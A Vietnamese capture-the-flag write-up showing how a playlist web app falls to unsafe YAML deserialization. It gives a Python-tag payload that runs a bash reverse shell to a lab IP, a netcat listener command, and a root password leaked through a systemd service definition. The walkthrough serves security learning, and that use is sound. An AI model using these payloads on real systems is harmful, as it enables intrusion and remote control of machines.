Bước 1: Truy cập vào trang web và tìm được tài khoản đăng nhập

<img width="1920" height="723" alt="image" src="https://github.com/user-attachments/assets/f9326505-c441-4020-b968-71134de5ff4b" />

Bước 2: Export playlist về để biết được cấu trúc của nó

<img width="502" height="396" alt="image" src="https://github.com/user-attachments/assets/7c129395-8a98-41d5-afdb-e3d916db00a4" />

Khi đã biết được cấu trúc ta tiến hành nộp 1 playlist để kiểm tra

<img width="890" height="651" alt="image" src="https://github.com/user-attachments/assets/7fbdd0de-205f-4255-b669-42b7eaf2166e" />

Phần trả về ta để ý rằng nó không xử lý playlist như 1 văn bản đơn thuần mà nó chuyển đổi các giá trị YAML thành các đối tượng Python.
Bước 3: Kiểm tra xem có hiểu các parser của python không

<img width="712" height="679" alt="image" src="https://github.com/user-attachments/assets/874b330c-ed61-4f2f-8844-462e6d25913c" />

Nhìn vào kết quả đầu ra cho ta thấy parser có thể giải quyết các tag của Python
Bước 4: Thiết lập listening và chạy shell code
nc -lvnp 444
shell code: 
name: !!python/object/apply:os.system
  - "bash -c 'bash -i >& /dev/tcp/10.48.81.155/444 0>&1'"
    
<img width="1000" height="433" alt="image" src="https://github.com/user-attachments/assets/4f1bb677-555e-40ba-9853-279ffc2022e1" />

Kiểm tra thư mục home của bartender ta lấy được flag đầu tiên 

<img width="761" height="313" alt="image" src="https://github.com/user-attachments/assets/abef47af-f8e6-4732-87c6-cbcd4bca15de" />

Bước 4: Sau khi đăng nhập với vai trò là bartender thì ta tiến hành leo thang đặc quyền
Tiến hành kiểm tra các file trong /opt, ta thấy trình phát nhạc jukeboxd.py yêu cầu mật khẩu để đăng nhập

<img width="1115" height="783" alt="image" src="https://github.com/user-attachments/assets/8513e05f-950e-4817-877c-852fc486ac83" />

Vì ứng dụng được quản lý bởi systemd , chúng ta có thể kiểm tra cách dịch vụ được khởi chạy:
systemctl show jukeboxd.service | grep ExecStart

<img width="1912" height="222" alt="image" src="https://github.com/user-attachments/assets/6239e10b-491b-43c0-9825-6e093b5a533a" />

Ở đây ta thấy được mật khẩu được truyền dưới dạng plaintext: SunsetSpritz2024!
Bước 5: Đăng nhập vào là root và lấy flag
<img width="441" height="158" alt="image" src="https://github.com/user-attachments/assets/e0ca1f25-7e2e-46aa-be2d-69bbdbfdd592" />



